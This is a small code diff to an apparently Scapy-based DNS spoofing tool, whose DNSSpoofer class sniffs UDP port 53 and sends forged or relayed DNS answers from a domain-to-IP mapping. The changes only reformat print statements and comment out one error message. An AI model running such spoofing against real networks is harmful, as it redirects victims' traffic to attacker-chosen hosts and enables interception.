@@ -97,14 +97,14 @@ class DNSSpoofer(threading.Thread):
                 DNS(data)
             )
             send(answer, iface=self.iface, verbose=False)
-            print(f"[=] Relayed {pkt[DNSQR].qname.decode()} to {pkt[IP].src}")
+            print("[=] Relayed {} to {}".format(pkt[DNSQR].qname.decode(), pkt[IP].src))
         except socket.timeout:
             print("[!] Upstream DNS timeout; dropping query")
         finally:
             sock.close()
 
     def run(self):
-        print(f"[*] DNS spoofing active on {self.iface}. Relay={self.relay}")
+        print("[*] DNS spoofing active on {}. Relay={}".format(self.iface, self.relay ))
         sniff(
             iface=self.iface,
             filter="udp port 53",
@@ -124,7 +124,7 @@ def load_mapping(path: Path) -> Dict[str, str]:
         try:
             ipaddress.ip_address(v)
         except ValueError:
-            print(f"[!] Invalid IP in mapping: {v}")
+            #print(f"[!] Invalid IP in mapping: {v}")
             continue
         mapping[k.lower()] = v
     return mapping
